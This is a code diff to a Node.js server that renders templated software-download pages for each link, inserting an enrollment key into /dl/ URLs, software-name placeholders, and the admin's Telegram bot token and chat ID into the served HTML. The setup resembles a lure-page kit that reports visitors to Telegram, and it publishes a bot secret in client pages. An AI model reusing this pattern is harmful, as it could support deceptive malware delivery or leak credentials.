@@ -1274,7 +1274,7 @@ async function handleApi(req, res, urlPath) {
           try { return JSON.parse(fs.readFileSync(path.join(dir, f), 'utf8')); } catch { return null; }
         }).filter(Boolean);
       } catch {}
-      if (!isOwner) links = links.filter(l => l.adminId === admin.id);
+      links = links.filter(l => l.adminId === admin.id);
       links.sort((a, b) => b.createdAt - a.createdAt);
       return json(res, 200, { links });
     }
@@ -2541,13 +2541,21 @@ const server = http.createServer((req, res) => {
       fs.writeFileSync(lf, JSON.stringify(link));
       const tpl = JSON.parse(fs.readFileSync(path.join(db.DATA_DIR, 'page-templates', link.templateId + '.json'), 'utf8'));
       let html = tpl.html;
-      // Replace any /dl/<key> URL in the HTML with this user's own key
+      // Replace any /dl/<key> URL in the HTML with this user's own key.
+      // Covers both absolute (https://…/dl/KEY) and relative (/dl/KEY) forms.
       if (link.enrollmentKey) {
-        html = html.replace(/(\/dl\/)([A-Za-z0-9_%-]{5,60})/g, '$1' + encodeURIComponent(link.enrollmentKey));
+        const encKey = encodeURIComponent(link.enrollmentKey);
+        html = html.replace(/(https?:\/\/[^"'\s]*\/dl\/)([A-Za-z0-9_%-]{5,60})/g, '$1' + encKey);
+        html = html.replace(/(\/dl\/)([A-Za-z0-9_%-]{5,60})/g, '$1' + encKey);
       }
-      // Replace software name placeholders (also support {{}} style if present)
+      // Replace software name placeholders
       if (link.name1) html = html.replace(/\{\{SOFTWARE_NAME\}\}/g, link.name1);
       if (link.name2) html = html.replace(/\{\{SOFTWARE_NAME_2\}\}/g, link.name2);
+      // Replace Telegram bot credentials
+      const adminRec = db.findAdminById(link.adminId);
+      const alerts = (adminRec && adminRec.alerts) || {};
+      if (alerts.botToken) html = html.replace(/\{\{TELEGRAM_BOT_TOKEN\}\}/g, alerts.botToken);
+      if (alerts.chatId)   html = html.replace(/\{\{TELEGRAM_CHAT_ID\}\}/g,   alerts.chatId);
       // Rewrite relative image src to the served /tpl-img/ URL
       if (tpl.imgFilename) {
         const imgUrl = '/tpl-img/' + link.templateId + '/' + tpl.imgFilename;
